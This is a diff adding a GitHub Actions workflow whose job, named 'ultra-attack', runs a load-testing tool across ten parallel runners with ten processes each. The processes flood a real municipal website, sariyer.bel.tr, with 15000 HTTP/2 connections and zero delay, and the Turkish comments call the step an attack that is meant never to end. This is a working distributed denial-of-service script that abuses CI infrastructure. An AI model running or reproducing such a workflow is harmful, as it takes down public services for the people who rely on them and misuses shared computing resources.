@@ -1,0 +1,38 @@
+name: Ultra Force Max Capacity
+on: workflow_dispatch
+
+jobs:
+  ultra-attack:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        # GitHub'ın izin verdiği max eşzamanlı makine (genelde 6-10 arası)
+        machine: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    
+    steps:
+      - name: Kaynakları Hazırla
+        run: |
+          # Sistem limitlerini maksimize et
+          sudo prlimit --pid $$ --nofile=1000000:1000000 || true
+          
+          # Repoyu kur
+          git clone https://github.com/Triotion/LoadTest.git
+          cd LoadTest
+          npm install && npm install http2-wrapper
+
+      - name: Çoklu İşlem Saldırısı (10x Power)
+        run: |
+          cd LoadTest
+          ulimit -n 1000000 || true
+          
+          # TEK MAKİNE İÇİNDE 10 AYRI PROSES BAŞLATIR
+          # Her bir proses kendi bağlantı havuzunu yönetir
+          for i in {1..10}
+          do
+            echo "Proses $i başlatılıyor..."
+            node loadtester.js -t https://sariyer.bel.tr/ --auto-detect -c 15000 -r 15000 --delay 0 --protocol http2 -d 65500 &
+          done
+          
+          # Tüm arka plan işlemlerinin bitmesini bekle (Bitmezler çünkü süre çok uzun)
+          wait
